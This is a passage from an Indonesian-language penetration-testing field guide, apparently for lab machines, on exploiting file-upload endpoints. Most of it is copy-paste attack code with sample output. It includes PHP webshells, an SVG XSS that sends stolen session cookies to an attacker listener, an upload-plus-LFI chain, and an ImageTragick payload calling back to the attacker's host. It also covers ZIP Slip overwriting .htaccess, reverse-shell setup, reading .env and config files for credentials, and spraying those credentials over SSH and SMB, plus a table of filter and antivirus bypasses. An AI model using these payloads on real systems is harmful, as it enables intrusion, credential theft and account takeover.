     -F "file=@~/fileupload_loot/payloads/xss.svg;filename=xss.svg;type=image/svg+xml" \
     http://$TARGET/upload.php
```

**OUTPUT BERHASIL ✅ — SVG diterima dan browser render:**

text

```
[*] HTTP Server listening on port 8000
10.10.11.200 - GET /?cookie=PHPSESSID=admin_session_abc123 HTTP/1.1
```

➡️ Dapat session cookie admin!  
➡️ Gunakan cookie untuk login sebagai admin  
➡️ Lanjut ke workflow sesuai privilege yang didapat

---

### Langkah 4.3 — Upload + LFI Chain

> Gunakan jika: file terupload tapi tidak bisa diakses langsung, tapi ada LFI vulnerability

Bash

```
# Step 1: Upload file PHP (meski tidak bisa akses langsung)
printf '<?php system($_GET["cmd"]); ?>' > ~/fileupload_loot/payloads/lfi_shell.php

curl -s \
     -F "file=@~/fileupload_loot/payloads/lfi_shell.php;filename=lfi_shell.php" \
     http://$TARGET/upload.php

# Catat path storage (dari response)
# Misalnya: /var/www/html/uploads/lfi_shell.php

# Step 2: Trigger via LFI
# Asumsikan LFI parameter adalah ?page=
curl -s "http://$TARGET/index.php?page=/var/www/html/uploads/lfi_shell.php&cmd=id"

# Atau relative path
curl -s "http://$TARGET/index.php?page=../uploads/lfi_shell.php&cmd=id"

# Atau path traversal variations
curl -s "http://$TARGET/index.php?page=....//....//uploads/lfi_shell.php&cmd=id"
```

**OUTPUT BERHASIL ✅ — LFI + Upload chain berhasil:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ **CHAIN BERHASIL!** Lanjut ke Fase 3 untuk upgrade ke reverse shell  
➡️ Dokumentasikan: cross-reference ke **[Workflow 24 — LFI / RFI](/docs/lfi-rfi)**

---

### Langkah 4.4 — ImageMagick / ImageTragick (CVE-2016-3714)

> Gunakan jika: server melakukan image processing (resize/convert/thumbnail)

Bash

```
# Deteksi image processing
# Upload image dan lihat apakah ada thumbnail atau resize
curl -s -F "file=@/tmp/real_image.jpg" http://$TARGET/upload.php
# Cek apakah ada thumbnail_*, resized_*, atau versi berbeda

# Jika ada processing, buat payload MVG
cat > ~/fileupload_loot/payloads/imagetragick.mvg << MVG
push graphic-context
viewbox 0 0 640 480
fill 'url(https://$LHOST:8000/|id)'
pop graphic-context
MVG

# Upload sebagai image
curl -i \
     -F "file=@~/fileupload_loot/payloads/imagetragick.mvg;filename=exploit.jpg;type=image/jpeg" \
     http://$TARGET/upload.php

# Monitor listener untuk callback
python3 -m http.server 8000
```

**OUTPUT BERHASIL ✅ — ImageMagick callback:**

text

```
10.10.11.200 - GET /?uid=33(www-data) HTTP/1.1
```

➡️ RCE via ImageMagick!  
➡️ Upgrade ke reverse shell dengan payload yang lebih kompleks

---

### Langkah 4.5 — ZIP Slip (Archive Extraction)

> Gunakan jika: aplikasi menerima ZIP/archive dan mengekstraknya

Bash

```
# Buat malicious ZIP dengan path traversal
python3 << 'PY'
from zipfile import ZipFile

with ZipFile("/tmp/zipslip.zip", "w") as z:
    # Target: overwrite file di parent directory
    z.writestr("../../uploads/evil_shell.php", '<?php system($_GET["cmd"]); ?>')
    # Target: overwrite .htaccess
    z.writestr("../../.htaccess", 'AddType application/x-httpd-php .jpg')

print("[*] zipslip.zip created")
print("[*] Contents:")
import zipfile
with zipfile.ZipFile("/tmp/zipslip.zip") as z:
    for name in z.namelist():
        print(f"  {name}")
PY

# Upload
curl -i \
     -F "file=@/tmp/zipslip.zip;filename=archive.zip;type=application/zip" \
     http://$TARGET/upload.php

# Test apakah berhasil
curl -s "http://$TARGET/uploads/evil_shell.php?cmd=id"
```

---

## ═══════════════════════════════════════

## FASE 5: POST EXPLOITATION

## ═══════════════════════════════════════

> Setelah dapat shell, kumpulkan informasi untuk lateral movement

### Langkah 5.1 — Enumeration dari Web Shell

Bash

```
# Via webshell (sebelum upgrade ke reverse shell)
WEBSHELL="http://$TARGET/uploads/cmd.php"

# System info
curl -s "$WEBSHELL?cmd=uname+-a"
curl -s "$WEBSHELL?cmd=id"
curl -s "$WEBSHELL?cmd=cat+/etc/passwd"
curl -s "$WEBSHELL?cmd=env" | grep -iE "db|pass|secret|key|api"

# Cari credentials di konfigurasi web
curl -G --data-urlencode "cmd=find /var/www -name '*.php' -readable 2>/dev/null | head -20" "$WEBSHELL"
curl -G --data-urlencode "cmd=grep -r 'password\|passwd\|db_pass' /var/www/ 2>/dev/null | head -20" "$WEBSHELL"

# Database connection info
curl -G --data-urlencode "cmd=cat /var/www/html/config.php" "$WEBSHELL"
curl -G --data-urlencode "cmd=cat /var/www/html/.env" "$WEBSHELL"

# Network info untuk pivoting
curl -G --data-urlencode "cmd=ip addr" "$WEBSHELL"
curl -G --data-urlencode "cmd=ss -tunp" "$WEBSHELL"
curl -G --data-urlencode "cmd=arp -n" "$WEBSHELL"
```

**OUTPUT BERHASIL ✅ — Menemukan credentials:**

text

```
DB_HOST=localhost
DB_USER=webapp
DB_PASSWORD=S3cr3tP@ss!
```

➡️ **SIMPAN CREDENTIALS:**

Bash

```
echo "webapp:S3cr3tP@ss!" >> ~/fileupload_loot/creds.txt
# Test credentials ke service lain
nxc ssh $TARGET -u webapp -p 'S3cr3tP@ss!'
nxc smb $TARGET -u webapp -p 'S3cr3tP@ss!'
```

### Langkah 5.2 — Cross-Service Credential Testing

Setelah dapat credentials dari webshell/config:

text

```
Upload Shell Credentials Found
         │
         ├─ ─→ Port 22  (SSH)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
         ├──→ Port 21  (FTP)     → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
         ├──→ Port 445 (SMB)     → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
         ├──→ Port 3306 (MySQL)  → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
         ├──→ Port 5985 (WinRM)  → evil-winrm
         └──→ Privilege Escalation → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — ERROR & SOLUSI

## ═══════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|`File type not allowed`|Blacklist extension|Test `.phtml`, `.php5`, `.phar`, case variations|
|`Invalid file type`|MIME validation|Tambah `type=image/jpeg` di curl `-F`|
|`File content invalid`|Magic bytes check|Tambah `GIF89a` atau JPEG bytes di awal file|
|Upload OK tapi 404 saat akses|Path salah|Fuzz upload directory, cek response upload|
|Upload OK tapi source ditampilkan|Server tidak eksekusi PHP|Coba `.htaccess`, LFI chain|
|Upload OK tapi 403 saat akses|Directory protected|Cek `Options -ExecCGI` atau server config|
|PHP executed tapi blank output|Error PHP tersembunyi|Tambah `error_reporting(E_ALL); ini_set('display_errors',1);`|
|Reverse shell gagal konek|Firewall outbound|Coba port 80, 443; test `curl http://attacker:8000` dari webshell|
|Shell langsung disconnect|PHP timeout|Buat persistent session via SSH key injection|
|`.htaccess` ditolak|Dotfile blocked|Coba `htaccess` (tanpa dot), atau double extension|
|Race condition gagal|Window terlalu kecil|Parallelkan lebih banyak request, kurangi polling delay|
|ImageMagick tidak trigger|Versi sudah patched|Cek versi: `convert --version` via webshell|
|ZIP Slip tidak berhasil|Extractor validasi path|Coba variasi path: `../`, `..%2F`, `..%252F`|
|SVG diterima tapi XSS tidak trigger|CSP atau content-disposition|Cek response header `Content-Type` saat akses SVG|
|Upload butuh CSRF token|CSRF protection|Ambil token dari form dulu, sertakan di request|
|Filename di-random|Server rename file|Baca URL dari response JSON/HTML setelah upload|
|File dihapus setelah upload|Antivirus / scanning|Race condition, atau bypass AV signature|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Upload Endpoint Ditemukan
│
├─ FASE 0: Fingerprint
│   ├─ Identifikasi server (Apache/Nginx/IIS/Tomcat)
│   ├─ Temukan upload endpoint
│   └─ Analisis request structure (field name, endpoint, response format)
│
├─ FASE 1: Probe Validasi
│   ├─ [Langsung diterima] → FASE 2 (Verify Execution)
│   ├─ [Extension diblokir] → Extension bypass (.phtml, .php5, .phar, case)
│   ├─ [MIME diblokir] → MIME bypass (type=image/jpeg)
│   ├─ [Magic bytes diblokir] → GIF89a polyglot, ExifTool inject
│   ├─ [Apache] → .htaccess upload
│   └─ [Timing] → Race condition
│
├─ FASE 2: Verify Execution
│   ├─ [PHP dieksekusi] → FASE 3 (Reverse Shell)
│   ├─ [Source ditampilkan] → Cari LFI atau .htaccess bypass
│   └─ [403 / tidak bisa akses] → Storage non-executable → LFI chain
│
├─ FASE 3: Reverse Shell
│   ├─ [Linux] → php-reverse-shell.php → stabilize TTY
│   └─ [Windows] → msfvenom ASPX → <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
│
├─ FASE 4: Advanced Scenarios
│   ├─ [SVG diterima] → SVG XSS → session hijacking
│   ├─ [ZIP diterima] → ZIP Slip path traversal
│   ├─ [Image processing] → ImageMagick CVE-2016-3714
│   └─ [LFI exists] → Upload + LFI chain → <a href="/docs/lfi-rfi" class="text-[#00b4d8] hover:underline font-mono font-semibold">24_lfi_rfi_workflow.md</a>
│
└─ FASE 5: Post Exploitation
    └─ Collect creds → Cross-service testing → Privesc
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
export UPLOAD_URL="http://$TARGET/upload.php"
mkdir -p ~/fileupload_loot/{payloads,shells,output}

# === RECON ===
curl -sI http://$TARGET/ | grep -iE "server|x-powered"
whatweb http://$TARGET/
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -fc 404 | grep -iE "upload|file|media"

# === PAYLOAD CREATION ===
printf '<?php echo "UPLOAD_OK"; ?>' > canary.php
printf '<?php system($_GET["cmd"]); ?>' > cmd.php
cp /usr/share/webshells/php/php-reverse-shell.php revshell.php
sed -i "s/127.0.0.1/$LHOST/g" revshell.php; sed -i "s/1234/$LPORT/g" revshell.php

# === UPLOAD VARIANTS ===
# Basic
curl -i -F "file=@canary.php" $UPLOAD_URL
# Custom filename
curl -i -F "file=@canary.php;filename=canary.php" $UPLOAD_URL
# MIME bypass
curl -i -F "file=@canary.php;filename=canary.php;type=image/jpeg" $UPLOAD_URL
# GIF polyglot
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > polyglot.gif.php
curl -i -F "file=@polyglot.gif.php;filename=shell.php;type=image/gif" $UPLOAD_URL
# .htaccess
printf 'AddType application/x-httpd-php .jpg' > .htaccess
curl -i -F "file=@.htaccess;filename=.htaccess;type=text/plain" $UPLOAD_URL

# === VERIFY EXECUTION ===
curl -s "http://$TARGET/uploads/canary.php"
curl -s "http://$TARGET/uploads/cmd.php?cmd=id"
curl -G --data-urlencode "cmd=id" "http://$TARGET/uploads/cmd.php"

# === LISTENER ===
rlwrap nc -lvnp $LPORT

# === SHELL STABILIZE ===
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm; stty rows 50 cols 220

# === POST EXPLOIT ===
curl -G --data-urlencode "cmd=cat /var/www/html/.env" "http://$TARGET/uploads/cmd.php"
curl -G --data-urlencode "cmd=grep -r 'password' /var/www/ 2>/dev/null" "http://$TARGET/uploads/cmd.php"
```

---

> **➡️ NEXT:** Setelah berhasil upload dan dapat shell, lanjut ke **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** (Linux) atau **[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)** (Windows) untuk privilege escalation. Jika menemukan credentials dari config file, test ke semua service dengan **[05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)** dan **[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)**.